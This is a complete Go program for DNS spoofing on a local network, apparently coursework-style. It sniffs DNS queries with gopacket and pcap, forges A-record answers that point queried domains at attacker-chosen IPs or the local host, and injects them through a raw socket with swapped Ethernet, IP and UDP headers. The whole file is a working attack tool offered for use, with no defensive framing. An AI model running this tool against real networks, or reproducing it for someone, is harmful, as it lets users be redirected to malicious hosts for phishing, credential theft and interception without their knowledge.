package main

import (
	"bufio"
	"container/list"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type entry struct {
	domain string
	ip     string
}

type DNSQueryStruct struct {
	ethConf *layers.Ethernet
	ipConf  *layers.IPv4
	udpConf *layers.UDP
	dnsConf *layers.DNS
}

var config struct {
	argInterface string
	argFile      string
	argExpr      string
}

var localIP net.IP

func InitializeDomainList(filename string) *list.List {
	file, err := os.Open(filename)
	if err != nil {
		panic(err)
	}
	listHeader := list.New()
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		text := scanner.Text()
		words := strings.Fields(text)
		if len(words) != 2 {
			panic("File format err")
		}
		node := entry{
			domain: words[1],
			ip:     words[0],
		}
		listHeader.PushBack(node)
	}
	return listHeader
}

func getUserInput() {
	config.argExpr = ""
	flag.StringVar(&config.argInterface, "i", "", "Interface Name")
	flag.StringVar(&config.argFile, "f", "", "File Name")
	flag.Parse()
	unProcessedCount := flag.NArg()
	if unProcessedCount == 0 {
		return
	}
	config.argExpr = strings.Join(os.Args[len(os.Args)-unProcessedCount:], " ")
}

func preProcessInterface() bool {
	devices, _ := pcap.FindAllDevs()

	// Check if user-defined interface exist
	for _, device := range devices {
		if len(config.argInterface) == 0 {
			config.argInterface = device.Name
			localIP = device.Addresses[0].IP
			return true
		}
		if device.Name == config.argInterface {
			localIP = device.Addresses[0].IP
			return true
		}
	}
	return false
}

func manipulateSpoofPacket(conf DNSQueryStruct, l *list.List) gopacket.SerializeBuffer {
	var targetIP net.IP
	targetIP = nil
	if l != nil {
		for e := l.Front(); e != nil; e = e.Next() {
			item := entry(e.Value.(entry))
			if item.domain == string(conf.dnsConf.Questions[0].Name) {
				targetIP = net.ParseIP(item.ip)
				break
			}
		}
	} else {
		targetIP = localIP
	}
	if targetIP == nil {
		return nil
	}

	dnsAnswer := layers.DNSResourceRecord{
		Name:  []byte(conf.dnsConf.Questions[0].Name),
		Type:  layers.DNSTypeA,
		Class: conf.dnsConf.Questions[0].Class,
		TTL:   200,
		IP:    targetIP,
	}
	dnsLayer := &layers.DNS{
		ID:           conf.dnsConf.ID,
		QR:           true,
		OpCode:       conf.dnsConf.OpCode,
		AA:           false,
		TC:           false,
		RD:           conf.dnsConf.RD,
		RA:           true,
		Z:            conf.dnsConf.Z,
		ResponseCode: 0,
		QDCount:      1,
		ANCount:      1,
		NSCount:      0,
		ARCount:      0,
		Questions:    conf.dnsConf.Questions,
		Answers:      []layers.DNSResourceRecord{dnsAnswer},
	}
	//tempBuffer := gopacket.NewSerializeBuffer()
	//err := gopacket.SerializeLayers(tempBuffer, dnsLayer)
	//if err != nil {
	//	panic(err)
	//}
	udpLayer := &layers.UDP{
		SrcPort: conf.udpConf.DstPort,
		DstPort: conf.udpConf.SrcPort,
		//Length:  uint16(binary.Size(tempBuffer.Bytes()) + 8),
	}
	ipLayer := &layers.IPv4{
		SrcIP:    conf.ipConf.DstIP,
		DstIP:    conf.ipConf.SrcIP,
		Version:  conf.ipConf.Version,
		IHL:      conf.ipConf.IHL,
		TOS:      conf.ipConf.TOS,
		Flags:    conf.ipConf.Flags,
		Protocol: conf.ipConf.Protocol,
		Options:  conf.ipConf.Options,
		TTL:      64,
	}
	ethLayer := &layers.Ethernet{
		SrcMAC:       conf.ethConf.DstMAC,
		DstMAC:       conf.ethConf.SrcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	udpLayer.SetNetworkLayerForChecksum(ipLayer)
	buffer := gopacket.NewSerializeBuffer()
	err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, ethLayer, ipLayer, udpLayer, dnsLayer)
	if err != nil {
		panic(err)
	}
	fmt.Printf("%s->%s, from %s, ID: %d, spoofing %s to %s\n", conf.ethConf.SrcMAC, conf.ethConf.DstMAC, conf.ipConf.SrcIP.String(), conf.dnsConf.ID, conf.dnsConf.Questions[0].Name, targetIP.String())
	return buffer
}

// These variables below are designed to be static variable inside func sentOutPkt()
// Since golang lack of support for static keywoard, the variables defined as global variables here
var netFdInited = false
var fd int
var addr_st syscall.SockaddrLinklayer

func sentOutPkt(buffer gopacket.SerializeBuffer) {
	if !netFdInited {
		iface, err := net.InterfaceByName(config.argInterface)
		if err != nil {
			panic(err)
		}

		addr_st.Ifindex = iface.Index

		// Since the manipulated packet was modified from link layer (for using fake MAC address), must use raw socket here
		fd, err = syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
		if err != nil {
			panic(err)
		}
		netFdInited = true
	}
	defer syscall.Sendto(fd, buffer.Bytes(), 0, &addr_st)
}

func packetResolver(packet gopacket.Packet, l *list.List) {
	eth := packet.Layer(layers.LayerTypeEthernet)
	ip := packet.Layer(layers.LayerTypeIPv4)
	udp := packet.Layer(layers.LayerTypeUDP)
	dns := packet.Layer(layers.LayerTypeDNS)
	icmp := packet.Layer(layers.LayerTypeICMPv4)
	if dns == nil || eth == nil || udp == nil || ip == nil || icmp != nil {
		return // Invalid dns packet
	}
	ethPkt, _ := eth.(*layers.Ethernet)
	ipPkt, _ := ip.(*layers.IPv4)
	udpPkt, _ := udp.(*layers.UDP)
	dnsPkt, _ := dns.(*layers.DNS)
	if dnsPkt.QR {
		// Response packet (ignore)
		return
	}
	conf := DNSQueryStruct{
		ethConf: ethPkt,
		ipConf:  ipPkt,
		udpConf: udpPkt,
		dnsConf: dnsPkt,
	}
	buf := manipulateSpoofPacket(conf, l)
	if buf != nil {
		sentOutPkt(buf)
	}
}

func startLiveCapture(iFaceName string, l *list.List) {
	handle, err := pcap.OpenLive(iFaceName, 65535, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	if len(config.argExpr) != 0 {
		if err := handle.SetBPFFilter(config.argExpr); err != nil {
			panic(err)
		}
	}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	fmt.Println("Spoofing server started...")

	for packet := range packetSource.Packets() {
		packetResolver(packet, l)
	}
}

func main() {
	getUserInput()
	if !preProcessInterface() {
		fmt.Println("invalid interface (check arguments)")
		return
	}
	if len(config.argFile) > 0 {
		l := InitializeDomainList(config.argFile)
		startLiveCapture(config.argInterface, l)
	} else {
		fmt.Println(config.argFile)
		startLiveCapture(config.argInterface, nil)
	}
}
